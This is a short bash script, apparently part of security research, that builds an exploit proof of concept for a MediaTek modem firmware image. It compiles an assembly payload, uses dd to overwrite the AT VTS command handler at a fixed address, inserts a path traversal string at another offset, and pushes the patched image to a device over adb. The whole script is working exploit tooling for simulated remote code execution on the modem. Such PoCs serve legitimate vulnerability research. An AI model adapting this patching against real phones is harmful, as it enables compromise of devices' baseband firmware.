#!/bin/bash

# The firmware image of the MTK modem
# The PoC is patched into it, simulating a remote code execution
# attack on the modem

target=modem_1_lwg_n.img
asm_src= patch3_vts_open_poc.S 

# Compile the PoC first
CC=arm-none-eabi-gcc
OBJCPY=arm-objcopy
OBJDMP=arm-objdump
eval "$CC -c $asm_src -o tmp.o"
eval "$OBJCPY -O binary tmp.o patch.bin"

# Overwrite AT VTS command handler in the modem
address=0x42E850
echo "Patching $target at $address"
# calculate size and offset of the patch
offset=$(($address))
size=$(stat --printf="%s" patch.bin)
# patch firmware
dd if=patch.bin of=$target bs=1 count=$size seek=$offset conv=notrunc

# patch in the path traversal string
path=path.bin
offset=$((0x705475))
echo "Patching $target at $offset"
size=$(stat --printf="%s" $path)
dd if=$path of=$target bs=1 count=$size seek=$offset conv=notrunc

echo "Copy to device"
adb push $target /data/local/tmp/${target%.img}.patched
